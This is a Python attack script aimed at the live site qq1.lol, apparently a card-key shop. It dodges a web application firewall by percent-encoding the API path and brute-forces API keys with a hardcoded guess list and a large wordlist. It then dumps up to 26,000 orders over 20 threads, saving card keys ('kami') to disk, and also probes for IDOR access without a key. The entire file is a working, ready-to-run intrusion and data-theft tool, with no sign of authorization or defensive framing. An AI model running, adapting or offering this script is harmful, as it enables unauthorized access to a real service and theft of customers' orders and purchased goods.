#!/usr/bin/env python3
"""qq1.lol api.php WAF bypass (%61pi.php) + API key brute + order dump"""
import json
import os
import subprocess
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from urllib.parse import quote

BASE = "https://qq1.lol/"
API = BASE + "%61pi.php"
OUT = Path(os.environ.get("QQ1_OUT", "/data/automation/results/qq1.lol"))
OUT.mkdir(parents=True, exist_ok=True)
JAR = str(OUT / ".cookies_api")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HITS = OUT / "KAMI_HIT.jsonl"
FOUND_KEY = OUT / "API_KEY_FOUND.txt"
LOG = OUT / "api_brute.log"
LOCK = threading.Lock()

# Priority keys from faka ecosystem
PRIORITY_KEYS = [
    "", "123456", "admin", "qq1", "buyi", "buyiq", "qqkqq", "faka", "rainbow",
    "mckuai", "epay", "key", "secret", "apikey", "api_key", "token", "authkey",
    "syskey", "sys_key", "password", "888888", "666666", "qq1.lol", "ka1.one",
    "buyi123", "buyi888", "830603", "123456789", "abcdef", "test", "root",
    "Lxsj@123", "ruoyi123", "jiankong", "cron", "merchant", "paykey",
]


def log(msg):
    with LOCK:
        line = f"[{datetime.now():%H:%M:%S}] {msg}"
        print(line, flush=True)
        with open(LOG, "a") as f:
            f.write(line + "\n")


def curl(url, retry=3):
    for _ in range(retry):
        cmd = ["curl", "-sk", "--max-time", "15", "-b", JAR, "-c", JAR, "-A", UA,
               "-H", f"Referer: {BASE}", "-H", "X-Requested-With: XMLHttpRequest", url]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=18).stdout or ""
            if r.strip():
                return r
        except Exception:
            pass
        time.sleep(0.2)
    return ""


def is_success(body):
    if not body:
        return False
    if "请提供用户登录信息或API对接密钥" in body or "No Act" in body:
        return False
    if '"code":0' in body or "success" in body.lower():
        return True
    if "kminfo" in body or "卡密" in body or "----" in body or "订单结果" in body:
        return True
    if '"code":-1' in body and "message" in body and "密钥" not in body:
        return True
    return False


def probe_api():
    log("=== API probe ===")
    acts = ["search", "orders", "order", "dump", "getorder", "list", "export",
            "getcount", "gettool", "login", "userinfo", "kami", "card"]
    for act in acts:
        for ep in ["%61pi.php", "api.php"]:
            body = curl(f"{BASE}{ep}?act={act}&id=1")
            log(f"  {ep}?act={act}: {body[:120]}")


def try_key(key):
    for param in ("key", "api_key", "token", "apikey", "authkey", "secret"):
        for act in ("search", "orders", "order", "getorder"):
            url = f"{API}?act={act}&id=1&{param}={quote(key, safe='')}"
            body = curl(url)
            if is_success(body):
                return act, param, key, body
            if body and "请提供" not in body and "No Act" not in body and len(body) > 30:
                log(f"  unusual act={act} {param}={key[:20]}: {body[:100]}")
    return None


def brute_keys(keys):
    log(f"=== API key brute ({len(keys)} keys) ===")
    for i, key in enumerate(keys):
        r = try_key(key)
        if r:
            act, param, key, body = r
            log(f"*** HIT act={act} {param}={key!r} -> {body[:200]}")
            FOUND_KEY.write_text(f"{param}={key}\n{body}\n")
            with open(HITS, "a") as f:
                f.write(json.dumps({"kind": "api_key", "param": param, "key": key, "resp": body[:2000]}, ensure_ascii=False) + "\n")
            return key, body
        if i % 50 == 0:
            log(f"  progress {i}/{len(keys)}")
    return None, None


def dump_orders(api_key, param="key", max_id=26000, workers=20):
    log(f"=== DUMP orders max_id={max_id} key={api_key[:20]}... ===")
    results = []

    def fetch(oid):
        for act in ("search", "orders", "order"):
            url = f"{API}?act={act}&id={oid}&{param}={quote(api_key, safe='')}"
            body = curl(url)
            if is_success(body):
                return oid, act, body
        return None

    with ThreadPoolExecutor(workers) as ex:
        futs = {ex.submit(fetch, i): i for i in range(1, max_id + 1)}
        done = 0
        for f in as_completed(futs):
            done += 1
            r = f.result()
            if r:
                oid, act, body = r
                results.append({"id": oid, "act": act, "body": body})
                with open(HITS, "a") as hf:
                    hf.write(json.dumps({"kind": "api_dump", "id": oid, "resp": body[:3000]}, ensure_ascii=False) + "\n")
                if "kminfo" in body or "卡密" in body or "----" in body:
                    log(f"*** KAMI id={oid} {body[:150]}")
            if done % 1000 == 0:
                log(f"  dump {done}/{max_id} hits={len(results)}")
    (OUT / "api_orders_dump.json").write_text(json.dumps(results, ensure_ascii=False, indent=2))
    log(f"DUMP DONE {len(results)} orders")
    return results


def load_dict(path):
    if Path(path).exists():
        return [l.strip() for l in open(path) if l.strip()]
    return []


def main():
    log("=== qq1.lol API brute start ===")
    curl(BASE)
    probe_api()

    keys = list(dict.fromkeys(PRIORITY_KEYS))
    big = Path(os.environ.get("API_DICT", "/data/wordlists/faka-tokens.txt"))
    if big.exists():
        keys += load_dict(big)[:50000]

    key, body = brute_keys(keys)
    if key:
        dump_orders(key, max_id=int(os.environ.get("API_MAX_ID", "26000")))
    else:
        log("no API key found in priority dict")

    # also try without key IDOR on all acts
    log("=== IDOR without key ===")
    for oid in [1, 100, 1000, 25900, 25915]:
        for act in ["search", "orders", "order", "getorder"]:
            body = curl(f"{API}?act={act}&id={oid}")
            if is_success(body):
                log(f"*** IDOR {act} id={oid}: {body[:200]}")

    log("=== done ===")


if __name__ == "__main__":
    main()
